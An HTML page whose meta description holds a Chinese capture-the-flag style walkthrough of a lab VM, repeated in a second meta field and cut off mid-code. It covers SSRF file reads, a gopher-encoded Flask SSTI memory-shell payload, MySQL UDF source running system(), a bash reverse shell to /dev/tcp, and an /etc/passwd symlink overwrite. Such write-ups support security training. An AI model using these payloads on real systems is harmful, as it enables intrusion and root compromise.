@@ -1,0 +1,2215 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/99706997?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# 1.信息收集
+
+常规扫描
+
+tcp
+```
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap --min-rate 10000 -p- 192.168.2.57  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 07:42 EST
+Nmap scan report for 192.168.2.57
+Host is up (0.00044s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:51:70:67 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 9.00 seconds
+                                                                                                     
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap -sV -sC -O -p22,80 192.168.2.57  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 07:43 EST
+Nmap scan report for 192.168.2.57
+Host is up (0.00024s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: Webpage Preview Tool
+MAC Address: 08:00:27:51:70:67 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.87 seconds
+
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap --script=vuln -p22,80 192.168.2.57
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 07:43 EST
+Nmap scan report for 192.168.2.57
+Host is up (0.00037s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-fileupload-exploiter: 
+|   
+|_    Couldn't find a file-type field.
+MAC Address: 08:00:27:51:70:67 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 37.37 seconds
+```
+udp
+```
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap -sU --top-ports 20 192.168.2.57  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 07:43 EST
+Nmap scan report for 192.168.2.57
+Host is up (0.00077s latency).
+
+PORT      STATE         SERVICE
+53/udp    closed        domain
+67/udp    closed        dhcps
+68/udp    open|filtered dhcpc
+69/udp    open|filtered tftp
+123/udp   open|filtered ntp
+135/udp   open|filtered msrpc
+137/udp   closed        netbios-ns
+138/udp   closed        netbios-dgm
+139/udp   open|filtered netbios-ssn
+161/udp   closed        snmp
+162/udp   closed        snmptrap
+445/udp   open|filtered microsoft-ds
+500/udp   closed        isakmp
+514/udp   closed        syslog
+520/udp   open|filtered route
+631/udp   closed        ipp
+1434/udp  closed        ms-sql-m
+1900/udp  open|filtered upnp
+4500/udp  open|filtered nat-t-ike
+49152/udp closed        unknown
+MAC Address: 08:00:27:51:70:67 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 14.47 seconds
+```
+tcp开放22，80端口，udp判断难度较大，优先级可排后
+
+# 2.web渗透
+
+## 初步测试
+
+
+web页面，很容易想到可能存在ssrf漏洞
+
+![[Pasted image 20251112204656.png]]
+
+利用file协议先尝试读取passwd文件
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+tftp:x:106:113:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin
+lemon:x:1001:1001:lemon:/home/lemon:/bin/bash
+mysql:x:107:114:MySQL Server,,,:/nonexistent:/bin/false
+```
+可以发现存在tftp用户，结合udp扫描结果，猜测可能会存在tftp服务
+
+## 本地端口探测
+
+ssrf更深的危害，多要结合其他服务产生，读取文件并未发现敏感信息，进行本地端口探测
+### 方法一
+
+==**老夜**==提供的方法也是目前最好的方法，读取/proc/net/tcp文件，在 Linux 系统中/proc/net/tcp文件提供了tcp连接的信息
+
+利用file协议读取
+```
+  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
+   0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 14261 1 0000000054c1d360 100 0 0 10 0                     
+   1: 0100007F:091C 00000000:0000 0A 00000000:00000000 00:00000000 00000000    33        0 15132 1 000000005eaf8d0a 100 0 0 10 0                     
+   2: 0100007F:091D 00000000:0000 0A 00000000:00000000 00:00000000 00000000    33        0 15144 1 00000000bd9ebf81 100 0 0 10 0                     
+   3: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000   107        0 15456 1 00000000a1bd6770 100 0 0 10 0    
+```
+转换一下信息
+```
+TCP 连接状态信息
+连接列表
+连接 0：
+- 本地地址: 0.0.0.0:22
+- 远程地址: 0.0.0.0:0
+- 状态: LISTEN (监听)
+- 发送队列: 0 字节
+- 接收队列: 0 字节
+- UID: 0 (root)
+- Inode: 14261
+
+连接 1：
+- 本地地址: 127.0.0.1:2332
+- 远程地址: 0.0.0.0:0
+- 状态: LISTEN (监听)
+- 发送队列: 0 字节
+- 接收队列: 0 字节
+- UID: 33
+- Inode: 15132
+
+连接 2：
+- 本地地址: 127.0.0.1:2333
+- 远程地址: 0.0.0.0:0
+- 状态: LISTEN (监听)
+- 发送队列: 0 字节
+- 接收队列: 0 字节
+- UID: 33
+- Inode: 15144
+
+连接 3：
+- 本地地址: 127.0.0.1:3306
+- 远程地址: 0.0.0.0:0
+- 状态: LISTEN (监听)
+- 发送队列: 0 字节
+- 接收队列: 0 字节
+- UID: 107
+- Inode: 15456
+
+服务说明
+- 端口 22: SSH 服务
+- 端口 3306: MySQL 数据库服务
+- 端口 2332/2333: 应用程序服务端口
+- 所有服务: 处于监听状态，等待连接
+```
+
+### 方法二
+利用ssrf中的dict协议爆破端口，http协议同样可以
+
+![[Pasted image 20251112211216.png]]
+扫出来了2332和2333端口
+
+## 源码文件
+
+http协议可以得到信息回显
+
+分别是
+```
+get reply.py
+get app.py
+```
+结合之前信息，可以尝试tftp连接获取这两个py文件
+
+```
+┌──(root㉿kali)-[/tmp/test]
+└─# tftp 192.168.2.57             
+tftp> get app.py
+tftp> get reply.py
+tftp> quit
+                                                                                                     
+┌──(root㉿kali)-[/tmp/test]
+└─# cat *
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return 'get app.py'
+
+
+
+
+
+#此处隐藏
+
+
+
+
+
+
+
+# 直接渲染 - 存在SSTI漏洞，在哪呢？
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=2333, debug=False, threaded=True)
+from flask import Flask, request
+import socket
+import threading
+
+app = Flask(__name__)
+
+def forward_to_2333(data):
+    def forward():
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(5)
+                s.connect(('127.0.0.1', 2333))
+                
+                # 构建HTTP POST请求
+                http_request = f'''********************
+
+***********************************************
+                '''
+                
+                s.send(http_request)
+                
+                # 接收响应但不处理
+                response = b''
+                while True:
+                    chunk = s.recv(4096)
+                    if not chunk:
+                        break
+                    response += chunk
+        except:
+            pass  # 忽略所有错误
+    
+    # 在后台线程中执行转发
+    thread = threading.Thread(target=forward)
+    thread.daemon = True
+    thread.start()
+
+@app.route('/', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
+def relay():
+    try:
+        # 获取原始数据
+        raw_data = request.get_data()
+        
+        # 在后台转发到2333端口
+        if raw_data:
+            forward_to_2333(raw_data)
+        
+        return 'get reply.py'
+        
+    except Exception:
+        return 'get reply.py'
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=2332, debug=False, threaded=True)
+```
+虽然隐藏了部分代码，结合提示，不难看出2332端口服务作为中继将得到的所有请求体不做任何处理转发到2333端口，在2333端口进行渲染导致ssti漏洞，而且均无回显
+
+而且ssrf仍然支持tftp协议可以直接利用tftp://127.0.0.1/app.py读取源码文件
+
+这也是预期路径，但是由于源码文件藏得不够深，就在opt下，所以同样也可以通过file协议直接读取到完整源码文件
+
+## getshell
+
+拿到shell的方法就是gopher打flask，方式有很多，这里采用注入内存马
+
+```
+payload:
+
+data={{url_for.__globals__.current_app.after_request_funcs.setdefault(None, []).append(
+    url_for.__globals__['__builtins__']['eval'](
+        'lambda resp: __import__('flask').make_response(__import__('os').popen(__import__('flask').request.args.get('cmd')).read()) if __import__('flask').request.args.get('cmd') else resp'
+))}}
+
+gopher编码结果
+
+gopher://127.0.0.1:2332/_POST%20%2F%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%3A2332%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%20331%0D%0A%0D%0Adata%3D%7B%7Burl_for.__globals__.current_app.after_request_funcs.setdefault%28None%2C%20%5B%5D%29.append%28%0A%20%20%20%20url_for.__globals__%5B%27__builtins__%27%5D%5B%27eval%27%5D%28%0A%20%20%20%20%20%20%20%20%22lambda%20resp%3A%20__import__%28%27flask%27%29.make_response%28__import__%28%27os%27%29.popen%28__import__%28%27flask%27%29.request.args.get%28%27cmd%27%29%29.read%28%29%29%20if%20__import__%28%27flask%27%29.request.args.get%28%27cmd%27%29%20else%20resp%22%0A%29%29%7D%7D
+
+```
+发送即可注入内存马，直接http://127.0.0.1:2333/?cmd=command即可执行命令
+
+# 3.提权
+
+## lemon
+
+在web目录下发现文件secret_of_lemon.txt，明显文件大小不对，less查看发现零宽字符
+
+```
+www-data@XIYI:~/html$ ls -al
+total 24
+drwxr-xr-x 2 root root 4096 Nov 11 03:57 .
+drwxr-xr-x 3 root root 4096 Apr  4  2025 ..
+-rw-r--r-- 1 root root 9563 Nov 10 23:06 index.php
+-rw-r--r-- 1 root root  547 Nov 11 03:57 secret_of_lemon.txt
+www-data@XIYI:~/html$ cat secret_of_lemon.txt 
+# Last updated: 2023-11-15
+nothing here
+# 
+www-data@XIYI:~/html$
+```
+解密得到凭据`lemon:Very_sour_lemon`
+
+### user.txt
+
+```
+lemon@XIYI:~$ cat user.txt 
+flag{lemon-d9832a587d8a4de1e69c94e1d907d421}
+```
+
+## root
+
+在lemon家目录下发现pass.txt，经过尝试是mysql数据库密码
+lemon的sudo权限以及开放的端口
+```
+lemon@XIYI:~$ cat pass.txt 
+root:rootted
+
+lemon@XIYI:~$ sudo -l
+Matching Defaults entries for lemon on XIYI:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User lemon may run the following commands on XIYI:
+    (root) NOPASSWD: /usr/bin/ln -sf * /usr/lib/mysql/plugin/*
+    
+    
+lemon@XIYI:~$ ss -lnt
+State       Recv-Q      Send-Q             Local Address:Port             Peer Address:Port      
+LISTEN      0           80                     127.0.0.1:3306                  0.0.0.0:*         
+LISTEN      0           128                      0.0.0.0:22                    0.0.0.0:*         
+LISTEN      0           128                    127.0.0.1:2332                  0.0.0.0:*         
+LISTEN      0           128                    127.0.0.1:2333                  0.0.0.0:*         
+LISTEN      0           128                            *:80                          *:*         
+LISTEN      0           128                         [::]:22                       [::]:* 
+```
+
+简单筛查可发现root.bak文件，权限仅mysql用户可读
+
+```
+lemon@XIYI:~$ find / -iname '*bak*' 2>/dev/null
+/usr/local/lib/python3.9/dist-packages/pytz/zoneinfo/Asia/Baku
+/usr/lib/mysql/plugin/root.bak
+/usr/share/zoneinfo/Asia/Baku
+/usr/share/zoneinfo/posix/Asia/Baku
+/usr/share/zoneinfo/right/Asia/Baku
+
+lemon@XIYI:~$ ls -al /usr/lib/mysql/plugin/root.bak
+-r-------- 1 mysql mysql 13 Nov 10 22:18 /usr/lib/mysql/plugin/root.bak
+```
+
+
+## 预期解
+
+通过mysql udf横向提权到mysql读取root.bak，然后提升至root权限
+
+这里不能直接通过load_file()读取文件，即使root.bak在其他目录下，因为mysql读取时是这样情况，其实有点神奇
+
+```
+root@XIYI:/tmp# mkdir test
+root@XIYI:/tmp# cd test/
+root@XIYI:/tmp/test# echo '123' >> root.bak
+root@XIYI:/tmp/test# chown mysql:mysql root.bak 
+root@XIYI:/tmp/test# chmod 400 root.bak 
+root@XIYI:/tmp/test# ls -al
+total 12
+drwxr-xr-x  2 root  root  4096 Nov 12 23:01 .
+drwxrwxrwt 11 root  root  4096 Nov 12 23:01 ..
+-r--------  1 mysql mysql    4 Nov 12 23:01 root.bak
+root@XIYI:/tmp/test# mysql -uroot -prootted
+
+MariaDB [(none)]> select load_file('/tmp/test/root.bak');
++---------------------------------+
+| load_file('/tmp/test/root.bak') |
++---------------------------------+
+| NULL                            |
++---------------------------------+
+1 row in set (0.000 sec)
+
+MariaDB [(none)]> exit
+Bye
+root@XIYI:/tmp/test# chmod 440 root.bak 
+root@XIYI:/tmp/test# ls -al
+total 12
+drwxr-xr-x  2 root  root  4096 Nov 12 23:01 .
+drwxrwxrwt 11 root  root  4096 Nov 12 23:01 ..
+-r--r-----  1 mysql mysql    4 Nov 12 23:01 root.bak
+
+root@XIYI:/tmp/test# mysql -uroot -prootted
+
+MariaDB [(none)]> select load_file('/tmp/test/root.bak');
++---------------------------------+
+| load_file('/tmp/test/root.bak') |
++---------------------------------+
+| NULL                            |
++---------------------------------+
+1 row in set (0.000 sec)
+
+MariaDB [(none)]> exit
+Bye
+root@XIYI:/tmp/test# chmod 444 root.bak 
+root@XIYI:/tmp/test# mysql -uroot -prootted
+
+MariaDB [(none)]> select load_file('/tmp/test/root.bak');
++---------------------------------+
+| load_file('/tmp/test/root.bak') |
++---------------------------------+
+| 123
+                            |
++---------------------------------+
+1 row in set (0.001 sec)
+
+MariaDB [(none)]>
+```
+从上述很容易看出问题所在
+
+编译恶意so文件，so文件需要保证mysql进程能够访问
+
+```
+udf.c
+
+#include <stdio.h>
+
+#include <stdlib.h>
+
+
+
+enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
+
+
+
+typedef struct st_udf_args {
+
+        unsigned int            arg_count;      // number of arguments
+
+        enum Item_result        *arg_type;      // pointer to item_result
+
+        char                    **args;         // pointer to arguments
+
+        unsigned long           *lengths;       // length of string args
+
+        char                    *maybe_null;    // 1 for maybe_null args
+
+} UDF_ARGS;
+
+
+
+typedef struct st_udf_init {
+
+        char                    maybe_null;     // 1 if func can return NULL
+
+        unsigned int            decimals;       // for real functions
+
+        unsigned long           max_length;     // for string functions
+
+        char                    *ptr;           // free ptr for func data
+
+        char                    const_item;     // 0 if result is constant
+
+} UDF_INIT;
+
+
+
+int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
+
+{
+
+        if (args->arg_count != 1)
+
+                return(0);
+
+
+
+        system(args->args[0]);
+
+
+
+        return(0);
+
+}
+
+
+
+char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
+
+{
+
+        return(0);
+
+}
+
+-------------------------------------------------------------------------
+
+lemon@XIYI:/tmp$ gcc -g -shared -o udf.so udf.c -lc
+lemon@XIYI:/tmp$ sudo /usr/bin/ln -sf /tmp/udf.so /usr/lib/mysql/plugin/udf.so
+
+
+lemon@XIYI:/tmp$ mysql -uroot -prootted
+
+MariaDB [(none)]> CREATE FUNCTION do_system RETURNS INTEGER SONAME 'udf.so';
+Query OK, 0 rows affected (0.002 sec)
+
+MariaDB [(none)]> SELECT * FROM mysql.func WHERE name='do_system';
++-----------+-----+--------+----------+
+| name      | ret | dl     | type     |
++-----------+-----+--------+----------+
+| do_system |   2 | udf.so | function |
++-----------+-----+--------+----------+
+1 row in set (0.001 sec)
+
+MariaDB [(none)]> SELECT do_system('/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.60/2332 0>&1'');
+strace: Process 1123 attached
+strace: Process 1124 attached
+strace: Process 1125 attached
+
+
+mysql@XIYI:/var/lib/mysql$ cat root.bak
+cat root.bak
+root:ezlemon
+```
+即可接收到mysql权限的shell，提权即可
+
+## 非预期解
+
+sudo权限提供了ln，路径穿越覆盖即可
+
+
+```
+sudo /usr/bin/ln -sf /home/lemon/passwd /usr/lib/mysql/plugin/../../../../../etc/passwd
+```
+
+## root.txt
+
+```
+root@XIYI:~# cat /root/root.txt 
+flag{root-e6a6e8eac98579c8d826d07df3c132bc}
+```
+
+# 附上脚本
+
+听是好多被gopher编码恶心到了，附上一直在用的脚本
+## gopher编码脚本
+```
+#!/usr/bin/env python3
+'''
+gopher_single_encode.py
+
+按'单次 percent-encode'规则生成 gopher POST 请求的 selector 和 gopher:// URL。">
+<meta property="og:title" content="XIYI-MJ">
+<meta property="og:description" content="# 1.信息收集
+
+常规扫描
+
+tcp
+```
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap --min-rate 10000 -p- 192.168.2.57  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 07:42 EST
+Nmap scan report for 192.168.2.57
+Host is up (0.00044s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:51:70:67 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 9.00 seconds
+                                                                                                     
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap -sV -sC -O -p22,80 192.168.2.57  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 07:43 EST
+Nmap scan report for 192.168.2.57
+Host is up (0.00024s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: Webpage Preview Tool
+MAC Address: 08:00:27:51:70:67 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.87 seconds
+
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap --script=vuln -p22,80 192.168.2.57
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 07:43 EST
+Nmap scan report for 192.168.2.57
+Host is up (0.00037s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-fileupload-exploiter: 
+|   
+|_    Couldn't find a file-type field.
+MAC Address: 08:00:27:51:70:67 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 37.37 seconds
+```
+udp
+```
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap -sU --top-ports 20 192.168.2.57  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 07:43 EST
+Nmap scan report for 192.168.2.57
+Host is up (0.00077s latency).
+
+PORT      STATE         SERVICE
+53/udp    closed        domain
+67/udp    closed        dhcps
+68/udp    open|filtered dhcpc
+69/udp    open|filtered tftp
+123/udp   open|filtered ntp
+135/udp   open|filtered msrpc
+137/udp   closed        netbios-ns
+138/udp   closed        netbios-dgm
+139/udp   open|filtered netbios-ssn
+161/udp   closed        snmp
+162/udp   closed        snmptrap
+445/udp   open|filtered microsoft-ds
+500/udp   closed        isakmp
+514/udp   closed        syslog
+520/udp   open|filtered route
+631/udp   closed        ipp
+1434/udp  closed        ms-sql-m
+1900/udp  open|filtered upnp
+4500/udp  open|filtered nat-t-ike
+49152/udp closed        unknown
+MAC Address: 08:00:27:51:70:67 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 14.47 seconds
+```
+tcp开放22，80端口，udp判断难度较大，优先级可排后
+
+# 2.web渗透
+
+## 初步测试
+
+
+web页面，很容易想到可能存在ssrf漏洞
+
+![[Pasted image 20251112204656.png]]
+
+利用file协议先尝试读取passwd文件
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+tftp:x:106:113:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin
+lemon:x:1001:1001:lemon:/home/lemon:/bin/bash
+mysql:x:107:114:MySQL Server,,,:/nonexistent:/bin/false
+```
+可以发现存在tftp用户，结合udp扫描结果，猜测可能会存在tftp服务
+
+## 本地端口探测
+
+ssrf更深的危害，多要结合其他服务产生，读取文件并未发现敏感信息，进行本地端口探测
+### 方法一
+
+==**老夜**==提供的方法也是目前最好的方法，读取/proc/net/tcp文件，在 Linux 系统中/proc/net/tcp文件提供了tcp连接的信息
+
+利用file协议读取
+```
+  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
+   0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 14261 1 0000000054c1d360 100 0 0 10 0                     
+   1: 0100007F:091C 00000000:0000 0A 00000000:00000000 00:00000000 00000000    33        0 15132 1 000000005eaf8d0a 100 0 0 10 0                     
+   2: 0100007F:091D 00000000:0000 0A 00000000:00000000 00:00000000 00000000    33        0 15144 1 00000000bd9ebf81 100 0 0 10 0                     
+   3: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000   107        0 15456 1 00000000a1bd6770 100 0 0 10 0    
+```
+转换一下信息
+```
+TCP 连接状态信息
+连接列表
+连接 0：
+- 本地地址: 0.0.0.0:22
+- 远程地址: 0.0.0.0:0
+- 状态: LISTEN (监听)
+- 发送队列: 0 字节
+- 接收队列: 0 字节
+- UID: 0 (root)
+- Inode: 14261
+
+连接 1：
+- 本地地址: 127.0.0.1:2332
+- 远程地址: 0.0.0.0:0
+- 状态: LISTEN (监听)
+- 发送队列: 0 字节
+- 接收队列: 0 字节
+- UID: 33
+- Inode: 15132
+
+连接 2：
+- 本地地址: 127.0.0.1:2333
+- 远程地址: 0.0.0.0:0
+- 状态: LISTEN (监听)
+- 发送队列: 0 字节
+- 接收队列: 0 字节
+- UID: 33
+- Inode: 15144
+
+连接 3：
+- 本地地址: 127.0.0.1:3306
+- 远程地址: 0.0.0.0:0
+- 状态: LISTEN (监听)
+- 发送队列: 0 字节
+- 接收队列: 0 字节
+- UID: 107
+- Inode: 15456
+
+服务说明
+- 端口 22: SSH 服务
+- 端口 3306: MySQL 数据库服务
+- 端口 2332/2333: 应用程序服务端口
+- 所有服务: 处于监听状态，等待连接
+```
+
+### 方法二
+利用ssrf中的dict协议爆破端口，http协议同样可以
+
+![[Pasted image 20251112211216.png]]
+扫出来了2332和2333端口
+
+## 源码文件
+
+http协议可以得到信息回显
+
+分别是
+```
+get reply.py
+get app.py
+```
+结合之前信息，可以尝试tftp连接获取这两个py文件
+
+```
+┌──(root㉿kali)-[/tmp/test]
+└─# tftp 192.168.2.57             
+tftp> get app.py
+tftp> get reply.py
+tftp> quit
+                                                                                                     
+┌──(root㉿kali)-[/tmp/test]
+└─# cat *
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return 'get app.py'
+
+
+
+
+
+#此处隐藏
+
+
+
+
+
+
+
+# 直接渲染 - 存在SSTI漏洞，在哪呢？
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=2333, debug=False, threaded=True)
+from flask import Flask, request
+import socket
+import threading
+
+app = Flask(__name__)
+
+def forward_to_2333(data):
+    def forward():
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(5)
+                s.connect(('127.0.0.1', 2333))
+                
+                # 构建HTTP POST请求
+                http_request = f'''********************
+
+***********************************************
+                '''
+                
+                s.send(http_request)
+                
+                # 接收响应但不处理
+                response = b''
+                while True:
+                    chunk = s.recv(4096)
